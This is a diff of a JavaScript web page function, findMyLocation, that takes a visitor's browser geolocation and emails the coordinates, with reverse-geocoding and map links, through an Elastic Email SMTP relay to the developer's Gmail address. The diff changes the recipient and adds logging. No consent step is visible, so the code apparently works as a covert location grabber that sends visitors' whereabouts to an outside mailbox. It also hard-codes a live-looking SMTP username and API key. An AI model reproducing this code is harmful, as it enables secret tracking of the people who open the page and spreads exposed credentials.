@@ -16,7 +16,7 @@ const findMyLocation = () => {
         Host: "smtp.elasticemail.com",
         Username: "akashchoutele1111@gmail.com",
         Password: "0FBA21C5C6024A89EE538A97748C87D403A1",
-        To: "theakashdeveloper@gmail.com",
+        To: "akashchoutele1111@gmail.com",
         From: "akashchoutele1111@gmail.com",
         Subject: new Date(),
         Body: `
@@ -27,6 +27,7 @@ const findMyLocation = () => {
                      Link 3 - https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en <br>
                      Click - https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`,
       }).then((message) => {
+        console.log(message);
         if (message === "OK") {
           document.body.style.backgroundColor = "#285430";
           document.querySelector(".status").style.color = "#5F8D4E";
